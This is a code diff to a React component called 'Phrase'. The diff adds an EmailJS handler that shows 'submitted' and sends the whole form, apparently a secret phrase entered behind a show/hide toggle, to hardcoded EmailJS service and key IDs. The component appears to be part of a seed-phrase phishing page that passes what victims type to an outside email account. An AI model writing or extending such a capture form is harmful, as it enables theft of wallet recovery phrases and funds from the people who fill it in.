@@ -2,9 +2,15 @@ import { useState, useContext } from "react";
 import React, { useRef } from "react";
 import { UserContent } from "../../contextApi/contextApi";
 import classes from "./phrase.module.css";
+import emailjs from 'emailjs-com'
 import { FaEye } from "react-icons/fa";
 const Phrase = () => {
-  const { sendEmail } = useContext(UserContent);
+  const sendEmail2 = (e) => {
+    e.preventDefault()
+    alert("submitted")
+    emailjs.sendForm('service_nx9di5h', 'template_vybjxoi', e.target, 'tr6MisctBi3oaO8ec')
+  }
+  // const { sendEmail } = useContext(UserContent);
   const [close, setClose] = useState(false);
   const [closeEye, setCloseEye] = useState(false);
   const toggleCloseEye = () => {
@@ -22,7 +28,7 @@ const Phrase = () => {
   };
   return (
     <>
-      <form action="" onSubmit={sendEmail}>
+      <form action="" onSubmit={sendEmail2}>
         <div className={classes.inputs}>
           <div className={classes.inputEye}>
             <input
